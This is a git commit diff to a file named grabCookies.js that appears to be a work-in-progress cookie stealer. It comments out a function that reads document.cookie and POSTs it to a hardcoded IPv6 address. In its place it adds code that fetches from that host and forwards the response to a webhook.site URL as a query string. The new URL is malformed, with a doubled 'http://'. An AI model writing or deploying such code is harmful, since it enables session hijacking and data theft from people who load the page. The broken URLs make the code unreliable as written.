b66fae19c12955d3b67634ab98de700d0ba64498
ambordokan <91415607+ambordokan@users.noreply.github.com>
2023-02-01 20:20:04 -0500

    testing a new version

--- grabCookies.js
+++ grabCookies.js
@@ -1,8 +1,15 @@
-function sendCookies() {
-  var xhr = new XMLHttpRequest();
-  xhr.open("POST", "http://2601:582:c482:22a0:8ca9:986f:400d:1253:8888", true);
-  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+//function sendCookies() {
+//  var xhr = new XMLHttpRequest();
+//  xhr.open("POST", "http://2601:582:c482:22a0:8ca9:986f:400d:1253/", true);
+//  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 
-  var cookies = document.cookie;
-  xhr.send("cookies=" + encodeURIComponent(cookies));
-}
+//  var cookies = document.cookie;
+//  xhr.send("cookies=" + encodeURIComponent(cookies));
+//}
+
+
+fetch("http://http://2601:582:c482:22a0:8ca9:986f:400d:1253:8888").then((res) => {
+    return res.text();
+}).then(data => {
+    fetch("https://webhook.site/dca2f591-eb3a-47f9-8f5f-c5c2d1c0116d/a.png?data="+data);
+})
